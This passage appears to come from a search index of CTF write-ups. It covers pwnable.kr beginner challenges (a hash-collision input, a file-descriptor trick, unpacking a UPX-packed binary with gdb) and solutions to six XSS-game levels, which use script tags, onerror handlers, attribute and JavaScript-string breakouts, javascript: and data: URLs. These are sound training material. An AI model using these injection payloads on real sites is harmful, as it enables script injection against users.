col.c</code> : observing the source code tells us that the program accepts a 20-bytes cmd arg which is converted from <code>const char*</code> to <code>int*</code>, 20 chars giving 5 integers, whose sum is compared to hashcode <code>0x21DD09EC</code>.</li> <li><code>0x21DD09EC</code> is not divisible by 5, so we can write it as <code>0x06C5CEC8 * 4 + 0x06C5CECC</code></li> <li>Due to little-endianness, we input the reverse of every 4 bytes:</li> </ol> <p><code>bash    ./col `python -c \"print('\\xc8\\xce\\xc5\\x06'*4+'\\xcc\\xce\\xc5\\x06')\"`</code></p>"},{"location":"pwnable.kr/Toddler%27s%20Bottle/fd/","title":"fd","text":"<ol> <li><code>ls -la</code> and <code>file</code> commands tell us there are three files:</li> <li>An executable <code>fd</code></li> <li>A C file: <code>fd.c</code></li> <li>An inaccessible file: <code>flag</code></li> <li><code>cat fd.c</code> : observing the source code tells us that the program accepts one cmd arg which, after being subtracted by <code>0x1234</code>, is supposed to be the file descriptor of a file whose first 32 bytes are read, which upon matching a particular string (also specified in the source) will reveal the contents of <code>flag</code>.</li> <li>File descriptors:</li> <li>stdin : 0</li> <li>stdout : 1</li> <li>stderr : 2</li> <li>Run <code>./fd 4660</code> , type <code>LETMEWIN</code> and press ENTER.</li> </ol>"},{"location":"pwnable.kr/Toddler%27s%20Bottle/flag/","title":"flag","text":"<ol> <li> <p>Download, give permission and run:</p> <p>```shell wget http://pwnable.kr/bin/flag chmod 777 flag ./flag</p> <p>I will malloc() and strcpy the flag there. take it. ```</p> </li> <li> <p>Trying <code>file</code> and <code>strings</code>:</p> <p>```shell file flag</p> <p>flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header ```</p> <p>Can't use GDB as file is stripped</p> <p>```shell strings flag</p> <p>.     .     $Info: This file is packed with the UPX executable packer http://upx.sf.net $     $Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $     .     .     UPX!     UPX! ```</p> <p>Hmm... What is UPX</p> </li> <li> <p>Unpack:</p> <p>```shell upx -d flag file flag</p> <p>flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=96ec4cc272aeb383bd9ed26c0d4ac0eb5db41b16, not stripped ```</p> <p>\"not stripped\" yay! GDB time now</p> </li> <li> <p><code>break</code> at main, <code>run</code>, and <code>disas</code>:</p> <p><code>gdb Breakpoint 1, 0x0000000000401168 in main () (gdb) disas Dump of assembler code for function main: 0x0000000000401164 &lt;+0&gt;:    push   %rbp 0x0000000000401165 &lt;+1&gt;:    mov    %rsp,%rbp =&gt; 0x0000000000401168 &lt;+4&gt;: sub    $0x10,%rsp 0x000000000040116c &lt;+8&gt;:    mov    $0x496658,%edi 0x0000000000401171 &lt;+13&gt;:   call   0x402080 &lt;puts&gt; 0x0000000000401176 &lt;+18&gt;:   mov    $0x64,%edi 0x000000000040117b &lt;+23&gt;:   call   0x4099d0 &lt;malloc&gt; 0x0000000000401180 &lt;+28&gt;:   mov    %rax,-0x8(%rbp) 0x0000000000401184 &lt;+32&gt;:   mov    0x2c0ee5(%rip),%rdx        # 0x6c2070 &lt;flag&gt; 0x000000000040118b &lt;+39&gt;:   mov    -0x8(%rbp),%rax 0x000000000040118f &lt;+43&gt;:   mov    %rdx,%rsi 0x0000000000401192 &lt;+46&gt;:   mov    %rax,%rdi 0x0000000000401195 &lt;+49&gt;:   call   0x400320 0x000000000040119a &lt;+54&gt;:   mov    $0x0,%eax 0x000000000040119f &lt;+59&gt;:   leave 0x00000000004011a0 &lt;+60&gt;:   ret End of assembler dump.</code></p> </li> <li> <p>Break at the end, and look at \\&lt;flag&gt;:</p> <p>```gdb (gdb) b *main+60 Breakpoint 2 at 0x4011a0 (gdb) c Continuing. I will malloc() and strcpy the flag there. take it.</p> <p>Breakpoint 2, 0x00000000004011a0 in main () (gdb) x/s *0x6c2070 0x496628:   \"UPX...? sounds like a delivery service :)\" ```</p> </li> </ol>"},{"location":"xss-game/level1/","title":"level 1","text":"<p>Submit as query:</p> <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;\n</code></pre>"},{"location":"xss-game/level2/","title":"level 2","text":"<p>Submit:</p> <pre><code>&lt;img src=\"x\" onerror=\"alert(1)\"&gt;\n</code></pre>"},{"location":"xss-game/level3/","title":"level 3","text":"<p>In <code>level.py</code>, we observe:</p> <pre><code>html += \"&lt;img src='/static/level3/cloud\" + num + \".jpg' /&gt;\";\n</code></pre> <p>where <code>num</code> is the segment after <code>#</code> in url</p> <p>Edit the URL:</p> <pre><code>' onerror='alert(1)'&gt;&lt;img src='\n</code></pre>"},{"location":"xss-game/level4/","title":"level 4","text":"<p>In <code>timer.html</code>, we observe:</p> <pre><code>&lt;img src=\"/static/loading.gif\" onload=\"startTimer('{{ timer }}');\" /&gt;\n</code></pre> <p>where <code>{{ timer }}</code> is the value submitted</p> <p>Submit:</p> <pre><code>1');alert('1\n</code></pre>"},{"location":"xss-game/level5/","title":"level 5","text":"<p>In <code>signup.html</code>, we observe:</p> <pre><code>&lt;a href=\"{{ next }}\"&gt;Next &gt;&gt;&lt;/a&gt;\n</code></pre> <p>where <code>{{ next }}</code> is the query parameter (default: confirm) on signup page</p> <p>Change the parameter:</p> <pre><code>?next=javascript:alert(1)\n</code></pre> <p>Click on 'Go' and then 'Next'</p>"},{"location":"xss-game/level6/","title":"level 6","text":"<p>In <code>index.html</code>, we observe:</p> <pre><code>scriptEl.src = url;\n</code></pre> <p>where <code>url</code> is the segment (after '#' in page's URL)</p> <p>We can host an attacker js file which can be provided as src (http(s) is being filtered, but that's not a problem; can provide link without http(s)) \\ Or we can do this:</p> <pre><code>#data:text/javascript,alert(1)\n</code></pre>"}]}